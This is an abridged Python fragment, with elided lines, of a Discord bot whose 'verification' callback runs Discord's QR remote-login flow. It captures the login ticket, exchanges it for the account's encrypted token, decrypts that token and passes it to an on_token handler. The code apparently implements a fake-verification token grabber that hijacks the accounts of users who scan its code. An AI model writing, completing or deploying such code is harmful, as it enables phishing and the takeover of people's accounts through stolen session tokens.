#Importing modules
import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests, websockets
    ...
    async def verification_callback(interaction):
        ...
        class RemoteAuthClient:
            ...
            async def run(self):
                ...
                async with websockets.connect("wss://remote-auth-gateway.discord.gg/?v=2", origin=Origin("https://discord.com")) as ws:
                    ...
                    while True:
                        ...
                        if p["op"] == "hello":
                            ...
                            print('received finish / encrypted token')
                            tckt = p["ticket"]
                            print("Ticket full : " + tckt)
                            print("Ticket p1 : " + tckt[:str.index(tckt, ".")])
                            bod = {"ticket": p["ticket"]}
                            res = requests.post(url="https://discord.com/api/v9/users/@me/remote-auth/login", json=bod).json()
                            await self.on_token(token=self.privateKey.decrypt(base64.b64decode(bytes(res["encrypted_token"], "utf8")), padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)).decode("utf8"))
                            break
                        ...
                        self._heartbeatTask.cancel(self)
